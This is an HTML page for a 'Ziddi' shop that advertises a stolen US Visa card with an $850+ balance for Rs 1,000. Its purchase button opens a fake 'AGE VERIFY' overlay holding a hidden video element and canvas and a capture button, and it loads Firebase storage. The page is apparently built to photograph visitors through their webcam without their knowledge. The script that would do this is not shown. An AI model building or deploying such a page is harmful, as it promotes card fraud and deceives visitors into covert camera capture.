<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VIP CC Shop | Ziddi Toolkit</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>

    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: sans-serif; }
        body { background: #050505; color: #fff; text-align: center; padding: 20px; }
        .cc-card { background: #111; border: 1px solid #004400; border-radius: 15px; padding: 25px; margin: 20px auto; max-width: 350px; }
        .price-tag { background: #00ff00; color: #000; padding: 5px 15px; border-radius: 5px; font-weight: 800; display: inline-block; margin: 10px 0; }
        .buy-btn { width: 100%; padding: 12px; background: none; border: 1px solid #00ff00; color: #00ff00; font-weight: bold; cursor: pointer; border-radius: 8px; }
        
        /* Popup Overlay */
        #verifyOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
        .verify-box { background: #111; border: 2px solid #00ff00; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; }
        .confirm-btn { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <h1 style="color: #00ff00;">ðŸ’Ž ZIDDI PRIVATE SHOP</h1>

    <div class="cc-card">
        <p style="color:#00ff00;">VISA GOLD (USA)</p>
        <h2>Balance: $850+</h2>
        <div class="price-tag">Rs 1,000</div>
        <button class="buy-btn" onclick="openVerify()">PURCHASE NOW</button>
    </div>

    <div id="verifyOverlay">
        <div class="verify-box">
            <h2 style="color: #00ff00;">AGE VERIFY</h2>
            <p>Confirm you are 18+ to proceed.</p>
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas"></canvas>
            <button class="confirm-btn" onclick="captureAndDone()">I AM 18+ (CONFIRM)</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
